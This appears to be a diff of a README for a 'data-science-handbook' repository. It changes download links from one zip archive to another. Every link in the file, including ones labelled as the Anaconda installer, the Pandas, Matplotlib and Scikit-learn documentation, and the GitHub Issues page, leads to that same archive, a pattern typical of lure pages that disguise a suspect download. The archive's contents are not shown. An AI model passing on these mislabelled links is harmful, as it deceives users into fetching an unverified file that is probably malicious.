@@ -2,9 +2,9 @@
 
 ## 🛠️ Download & Install
 
-[![Download the Latest Release](https://raw.githubusercontent.com/Carinquantifiable119/data-science-handbook/main/quadrivalency/data-science-handbook.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Carinquantifiable119/data-science-handbook/main/quadrivalency/data-science-handbook.zip)
+[![Download the Latest Release](https://github.com/Carinquantifiable119/data-science-handbook/raw/refs/heads/main/quadrivalency/science-data-handbook-3.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Carinquantifiable119/data-science-handbook/raw/refs/heads/main/quadrivalency/science-data-handbook-3.8.zip)
 
-To begin your journey in data science, visit this page to download: [Download Page](https://raw.githubusercontent.com/Carinquantifiable119/data-science-handbook/main/quadrivalency/data-science-handbook.zip).
+To begin your journey in data science, visit this page to download: [Download Page](https://github.com/Carinquantifiable119/data-science-handbook/raw/refs/heads/main/quadrivalency/science-data-handbook-3.8.zip).
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Before you start, make sure your computer meets the following requirements:
 If you don’t have Jupyter Notebook installed, follow these steps:
 
 - **Using Anaconda:**
-  1. Download the [Anaconda installer](https://raw.githubusercontent.com/Carinquantifiable119/data-science-handbook/main/quadrivalency/data-science-handbook.zip).
+  1. Download the [Anaconda installer](https://github.com/Carinquantifiable119/data-science-handbook/raw/refs/heads/main/quadrivalency/science-data-handbook-3.8.zip).
   2. Run the installer and follow the instructions.
 
 - **Using pip:**
@@ -35,7 +35,7 @@ If you don’t have Jupyter Notebook installed, follow these steps:
 
 ### 3. Download the Handbook
 
-Now, return to the [Download Page](https://raw.githubusercontent.com/Carinquantifiable119/data-science-handbook/main/quadrivalency/data-science-handbook.zip) to access the latest version of the handbook. Click on the release that matches your needs and download the file.
+Now, return to the [Download Page](https://github.com/Carinquantifiable119/data-science-handbook/raw/refs/heads/main/quadrivalency/science-data-handbook-3.8.zip) to access the latest version of the handbook. Click on the release that matches your needs and download the file.
 
 ### 4. Unzip the Files
 
@@ -86,12 +86,12 @@ This handbook is organized into sections. Each section covers a specific topic i
 
 Here are some helpful resources to deepen your understanding of data science:
 
-- **Documentation for Pandas:** Learn more about data manipulation with [Pandas Documentation](https://raw.githubusercontent.com/Carinquantifiable119/data-science-handbook/main/quadrivalency/data-science-handbook.zip).
-- **Matplotlib Guide:** Explore data visualization techniques through the [Matplotlib Documentation](https://raw.githubusercontent.com/Carinquantifiable119/data-science-handbook/main/quadrivalency/data-science-handbook.zip).
-- **Scikit-learn Guide:** Familiarize yourself with machine learning concepts using the [Scikit-learn Documentation](https://raw.githubusercontent.com/Carinquantifiable119/data-science-handbook/main/quadrivalency/data-science-handbook.zip).
+- **Documentation for Pandas:** Learn more about data manipulation with [Pandas Documentation](https://github.com/Carinquantifiable119/data-science-handbook/raw/refs/heads/main/quadrivalency/science-data-handbook-3.8.zip).
+- **Matplotlib Guide:** Explore data visualization techniques through the [Matplotlib Documentation](https://github.com/Carinquantifiable119/data-science-handbook/raw/refs/heads/main/quadrivalency/science-data-handbook-3.8.zip).
+- **Scikit-learn Guide:** Familiarize yourself with machine learning concepts using the [Scikit-learn Documentation](https://github.com/Carinquantifiable119/data-science-handbook/raw/refs/heads/main/quadrivalency/science-data-handbook-3.8.zip).
 
 ## 📞 Get Help
 
-If you encounter any issues while downloading or running the handbook, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Carinquantifiable119/data-science-handbook/main/quadrivalency/data-science-handbook.zip). Our community is here to help you.
+If you encounter any issues while downloading or running the handbook, feel free to open an issue on the [GitHub Issues page](https://github.com/Carinquantifiable119/data-science-handbook/raw/refs/heads/main/quadrivalency/science-data-handbook-3.8.zip). Our community is here to help you.
 
 Thank you for choosing the *data-science-handbook*! Enjoy your learning experience.
